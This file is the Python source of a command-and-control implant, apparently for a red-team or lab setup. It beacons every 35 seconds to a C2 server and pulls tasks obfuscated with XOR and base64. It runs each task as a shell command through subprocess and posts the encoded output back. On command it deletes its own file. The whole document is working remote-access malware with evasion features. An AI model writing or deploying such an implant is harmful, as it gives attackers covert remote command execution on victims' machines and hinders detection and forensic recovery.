#!/usr/bin/env python3
import base64
import os
import subprocess
import time
import uuid

import requests

# Shared secret used for obfuscation.
# (In practice, use a stronger key and proper encryption)
KEY = b"mysecretkey"


C2_URL = "http://127.0.0.1:8000"  # Ensure this matches the C2 server's address and port
IMPLANT_ID = str(uuid.uuid4())  # Unique implant ID for this instance
SLEEP_TIME = 35  # Seconds between beacon attempts


# Print the Implant ID at startup (for debugging/tracking)
print(f"[*] Implant started with ID: {IMPLANT_ID}")


def xor_crypt(data: bytes, key: bytes) -> bytes:
    """XOR each byte of data with the key (repeating as needed)."""
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])


def encode(data: str) -> str:
    """Obfuscate data using XOR and then Base64 encode it."""
    return base64.b64encode(xor_crypt(data.encode(), KEY)).decode()


def decode(data: str) -> str:
    """Deobfuscate data by Base64 decoding and then applying XOR."""
    return xor_crypt(base64.b64decode(data), KEY).decode()


def get_task() -> str:
    """Fetch the next task from the C2 server."""
    try:
        print("[*] Attempting to fetch task from C2 server...")
        r = requests.get(f"{C2_URL}/task/{IMPLANT_ID}")
        if r.status_code == 200:
            task_obf = r.text.strip()
            print(f"[*] Received obfuscated task: {task_obf}")
            return decode(task_obf)
        else:
            print(f"[!] Failed to fetch task, status code: {r.status_code}")
    except Exception as e:
        print(f"[!] Error getting task: {e}")
    return ""


def send_result(output: str) -> None:
    """Send the result/output of executed commands back to the C2 server."""
    try:
        encoded = encode(output)
        requests.post(f"{C2_URL}/report", json={"id": IMPLANT_ID, "output": encoded})
    except Exception as e:
        print(f"[!] Error sending result: {e}")


def self_destruct() -> None:
    """Self-delete the implant and exit."""
    print("[*] Self-destruct triggered.")
    try:
        os.remove(__file__)
    except Exception as e:
        print(f"[!] Error during self-destruct: {e}")
    exit()


def main_loop() -> None:
    """Main loop: check in with the C2 server, execute tasks if provided."""
    while True:
        task = get_task()
        if task:
            if task.strip() == "selfdestruct":
                self_destruct()
            else:
                try:
                    print(f"[*] Executing task: {task}")
                    result = subprocess.getoutput(task)
                    send_result(result)
                except Exception as e:
                    send_result(f"Error: {e}")
        time.sleep(SLEEP_TIME)


if __name__ == "__main__":
    main_loop()
